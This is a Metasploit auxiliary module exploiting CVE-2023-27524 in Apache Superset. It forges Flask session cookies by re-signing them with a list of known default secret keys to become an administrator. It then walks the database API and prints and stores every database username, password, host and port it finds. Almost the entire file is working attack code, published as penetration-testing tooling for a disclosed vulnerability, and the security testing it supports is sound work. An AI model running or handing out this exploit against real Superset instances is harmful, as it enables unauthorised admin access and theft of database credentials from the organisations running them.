##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Apache Superset Signed Cookie Priv Esc',
        'Description' => %q{
          Apache Superset versions <= 2.0.0 utilize Flask with a known default secret key which is used to sign HTTP cookies.
          These cookies can therefore be forged. If a user is able to login to the site, they can decode the cookie, set their user_id to that
          of an administrator, and re-sign the cookie. This valid cookie can then be used to login as the targeted user and retrieve database
          credentials saved in Apache Superset.
        },
        'Author' => [
          'h00die', # MSF module
          'paradoxis', #  original flask-unsign tool
          'Spencer McIntyre', # MSF flask-unsign library
          'Naveen Sunkavally' # horizon3.ai writeup and cve discovery
        ],
        'References' => [
          ['URL', 'https://github.com/Paradoxis/Flask-Unsign'],
          ['URL', 'https://vulcan.io/blog/cve-2023-27524-in-apache-superset-what-you-need-to-know/'],
          ['URL', 'https://www.horizon3.ai/cve-2023-27524-insecure-default-configuration-in-apache-superset-leads-to-remote-code-execution/'],
          ['URL', 'https://github.com/horizon3ai/CVE-2023-27524/blob/main/CVE-2023-27524.py'],
          ['EDB', '51447'],
          ['CVE', '2023-27524' ],
        ],
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        },
        'DisclosureDate' => '2023-04-25'
      )
    )
    register_options(
      [
        Opt::RPORT(8088),
        OptString.new('USERNAME', [true, 'The username to authenticate as', nil]),
        OptString.new('PASSWORD', [true, 'The password for the specified username', nil]),
        OptInt.new('ADMIN_ID', [true, 'The ID of an admin account', 1]),
        OptString.new('TARGETURI', [ true, 'Relative URI of Apache Superset installation', '/'])
      ]
    )
  end

  def check
    res = send_request_cgi!({
      'uri' => normalize_uri(target_uri.path, 'login')
    })
    return Exploit::CheckCode::Unknown("#{peer} - Could not connect to web service - no response") if res.nil?
    return Exploit::CheckCode::Unknown("#{peer} - Unexpected response code (#{res.code})") unless res.code == 200
    return Exploit::CheckCode::Safe("#{peer} - Unexpected response, version_string not detected") unless res.body.include? 'version_string'
    unless res.body =~ /&#34;version_string&#34;: &#34;([\d.]+)&#34;/
      return Exploit::CheckCode::Safe("#{peer} - Unexpected response, unable to determine version_string")
    end

    version = Rex::Version.new(Regexp.last_match(1))
    if version < Rex::Version.new('2.0.1') && version >= Rex::Version.new('1.4.1')
      Exploit::CheckCode::Vulnerable("Apache Supset #{version} is vulnerable")
    else
      Exploit::CheckCode::Safe("Apache Supset #{version} is NOT vulnerable")
    end
  end

  def valid_cookie(decoded_cookie)
    [
      "\x02\x01thisismyscretkey\x01\x02\\e\\y\\y\\h", # version < 1.4.1
      'CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET',          # version >= 1.4.1
      'thisISaSECRET_1234',                            # deployment template
      'YOUR_OWN_RANDOM_GENERATED_SECRET_KEY',          # documentation
      'TEST_NON_DEV_SECRET'                            # docker compose
    ].each do |secret|
      print_status("Attempting to resign with key: #{secret}")
      encoded_cookie = Msf::Exploit::Remote::HTTP::FlaskUnsign::Session.sign(decoded_cookie, secret)
      print_status("#{peer} - New signed cookie: #{encoded_cookie}")
      cookie_jar.clear
      res = send_request_cgi(
        'uri' => normalize_uri(target_uri.path, 'api', 'v1', 'me', '/'),
        'cookie' => "session=#{encoded_cookie};",
        'keep_cookies' => true
      )
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
      if res.code == 401
        print_bad("#{peer} - Cookie not accepted")
        next
      end
      data = res.get_json_document
      print_good("#{peer} - Cookie validated to user: #{data['result']['username']}")
      return encoded_cookie
    end
  end

  def run
    res = send_request_cgi!({
      'uri' => normalize_uri(target_uri.path, 'login'),
      'keep_cookies' => true
    })
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected response code (#{res.code})") unless res.code == 200

    fail_with(Failure::NotFound, 'Unable to determine csrf token') unless res.body =~ /name="csrf_token" type="hidden" value="([\w.-]+)">/

    csrf_token = Regexp.last_match(1)
    vprint_status("#{peer} - CSRF Token: #{csrf_token}")
    cookie = res.get_cookies.to_s
    print_status("#{peer} - Initial Cookie: #{cookie}")
    decoded_cookie = Msf::Exploit::Remote::HTTP::FlaskUnsign::Session.decode(cookie.split('=')[1].gsub(';', ''))
    print_status("#{peer} - Decoded Cookie: #{decoded_cookie}")
    print_status("#{peer} - Attempting login")
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'login', '/'),
      'keep_cookies' => true,
      'method' => 'POST',
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_post' => {
        'username' => datastore['USERNAME'],
        'password' => datastore['PASSWORD'],
        'csrf_token' => csrf_token
      }
    })
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::NoAccess, "#{peer} - Failed login") if res.body.include? 'Sign In'
    cookie = res.get_cookies.to_s
    print_good("#{peer} - Logged in Cookie: #{cookie}")
    decoded_cookie = Msf::Exploit::Remote::HTTP::FlaskUnsign::Session.decode(cookie.split('=')[1].gsub(';', ''))
    decoded_cookie['user_id'] = datastore['ADMIN_ID']
    print_status("#{peer} - Modified cookie: #{decoded_cookie}")
    admin_cookie = valid_cookie(decoded_cookie)

    fail_with(Failure::NoAccess, "#{peer} - Unable to sign cookie with a valid secret") if admin_cookie.nil?
    (1..101).each do |i|
      res = send_request_cgi(
        'uri' => normalize_uri(target_uri.path, 'api', 'v1', 'database', i),
        'cookie' => "session=#{admin_cookie};",
        'keep_cookies' => true
      )
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
      if res.code == 401 || res.code == 404
        print_status('Done enumerating databases')
        break
      end
      result_json = res.get_json_document
      db_name = result_json['result']['parameters']['database']
      db_type = result_json['result']['backend']
      db_host = result_json['result']['parameters']['host']
      db_port = result_json['result']['parameters']['port']
      db_pass = result_json['result']['parameters']['password']
      db_user = result_json['result']['parameters']['username']
      if framework.db.active
        create_credential_and_login({
          address: db_host,
          port: db_port,
          protocol: 'tcp',
          workspace_id: myworkspace_id,
          origin_type: :service,
          service_name: db_type,
          username: db_user,
          private_type: :password,
          private_data: db_pass,
          module_fullname: fullname,
          status: Metasploit::Model::Login::Status::UNTRIED
        })
      end
      print_good("Found #{db_type} database #{db_name}: #{db_user}:#{db_pass}@#{db_host}:#{db_port}")
    end
  end
end
